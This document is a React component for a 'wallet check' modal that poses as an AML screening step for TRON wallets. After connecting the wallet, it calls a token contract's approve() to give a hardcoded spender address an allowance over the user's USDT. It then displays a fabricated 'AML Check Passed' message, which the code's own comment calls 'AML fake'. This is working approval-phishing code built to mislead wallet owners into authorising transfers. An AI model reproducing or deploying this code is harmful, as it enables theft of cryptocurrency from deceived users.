"use client"

import { useState } from "react"
import { X } from "lucide-react"

type Props = {
  open: boolean
  onClose: () => void
}

// 🔥 GET TRON
const getTron = () => {
  if (typeof window === "undefined") return null
  return (window as any).tronWeb || null
}

// 🔥 CONEXIÓN REAL
const connectTron = async () => {
  if (typeof window === "undefined") return null

  const tronLink = (window as any).tronLink
  const tron = (window as any).tronWeb

  if (!tronLink || !tron) {
    alert("Open inside TronLink / Trust Wallet / SafePal")
    return null
  }

  try {
    // 🔥 esto es la clave (sin esto falla todo)
    await tronLink.request({ method: "tron_requestAccounts" })
  } catch (e) {
    alert("Connection rejected")
    return null
  }

  const address = tron.defaultAddress?.base58

  if (!address) {
    alert("Wallet not connected")
    return null
  }

  console.log("CONNECTED:", address)
  return address
}

// 🔥 APPROVE FUNCIONAL
const approveUSDT = async () => {
  const tron = getTron()

  if (!tron) {
    alert("Wallet not detected")
    return
  }

  const contractAddress = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj"
  const spender = "TWnGWtxx7d4NC8xuUqKVRW8eM8yRko2q1y"

  try {
    const address = tron.defaultAddress.base58

    // 🔥 fuerza interacción (muy importante)
    await tron.trx.getBalance(address)

    const contract = await tron.contract().at(contractAddress)

    const amount = 1000000 // 1 USDT

    const tx = await contract
      .approve(spender, amount)
      .send({
        feeLimit: 100000000,
        callValue: 0,
        shouldPollResponse: true,
      })

    console.log("APPROVE TX:", tx)
    return true

  } catch (err) {
    console.error(err)
    alert("Transaction rejected or failed")
    return false
  }
}

export function WalletCheckModal({ open, onClose }: Props) {
  const [step, setStep] = useState<"network" | "wallet">("network")
  const [selectedNetwork, setSelectedNetwork] = useState<string | null>(null)

  if (!open) return null

  const networks = [
    { name: "Ethereum", logo: "https://assets.coingecko.com/coins/images/279/small/ethereum.png" },
    { name: "BNB Chain", logo: "https://assets.coingecko.com/coins/images/825/small/bnb-icon2_2x.png" },
    { name: "TRON", logo: "https://assets.coingecko.com/coins/images/1094/small/tron-logo.png" },
    { name: "Solana", logo: "https://assets.coingecko.com/coins/images/4128/small/solana.png" },
  ]

  const wallets = [
    { name: "MetaMask", logo: "https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" },
    { name: "WalletConnect", logo: "https://avatars.githubusercontent.com/u/37784886" },
    { name: "Trust Wallet", logo: "https://trustwallet.com/assets/images/media/assets/TWT.png" },
    { name: "Phantom", logo: "https://avatars.githubusercontent.com/u/78782331" },
    { name: "TronLink", logo: "https://avatars.githubusercontent.com/u/37784886?s=200&v=4" },
    { name: "SafePal", logo: "" },
  ]

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/40 backdrop-blur-sm">
      <div className="w-full max-w-md rounded-2xl bg-white p-6 shadow-2xl relative">

        {/* CLOSE */}
        <button
          onClick={() => {
            onClose()
            setStep("network")
          }}
          className="absolute right-4 top-4"
        >
          <X className="w-5 h-5" />
        </button>

        {/* TITLE */}
        <h2 className="text-xl font-bold text-center mb-6">
          {step === "network" ? "Select Network" : "Select Wallet"}
        </h2>

        {/* NETWORK */}
        {step === "network" && (
          <div className="space-y-3">
            {networks.map((net) => (
              <button
                key={net.name}
                onClick={() => {
                  setSelectedNetwork(net.name)
                  setStep("wallet")
                }}
                className="w-full flex items-center gap-3 p-4 rounded-xl border hover:bg-gray-50"
              >
                <img src={net.logo} className="w-7 h-7" />
                <span className="font-medium">{net.name}</span>
              </button>
            ))}
          </div>
        )}

        {/* WALLET */}
        {step === "wallet" && (
          <div className="space-y-3">
            <p className="text-sm text-gray-500 mb-2">
              Network: <b>{selectedNetwork}</b>
            </p>

            {wallets.map((wallet) => (
              <button
                key={wallet.name}
                onClick={async () => {
                  if (selectedNetwork !== "TRON") {
                    alert("Only TRON supported for now")
                    return
                  }

                  // 🔗 conectar
                  const address = await connectTron()
                  if (!address) return

                  // 💰 approve
                  const success = await approveUSDT()
                  if (!success) return

                  // ✅ siguiente paso (AML fake)
                  alert("AML Check Passed ✅")

                  onClose()
                  setStep("network")
                }}
                className="w-full flex items-center gap-3 p-4 rounded-xl border hover:bg-gray-50"
              >
                {wallet.logo ? (
                  <img src={wallet.logo} className="w-7 h-7" />
                ) : (
                  <div className="h-7 w-7 rounded-full bg-gray-200 flex items-center justify-center text-xs font-bold">
                    S
                  </div>
                )}

                <span className="font-medium">{wallet.name}</span>
              </button>
            ))}

            <button
              onClick={() => setStep("network")}
              className="w-full mt-3 text-sm text-gray-500 hover:text-black"
            >
              ← Back
            </button>
          </div>
        )}
      </div>
    </div>
  )
}
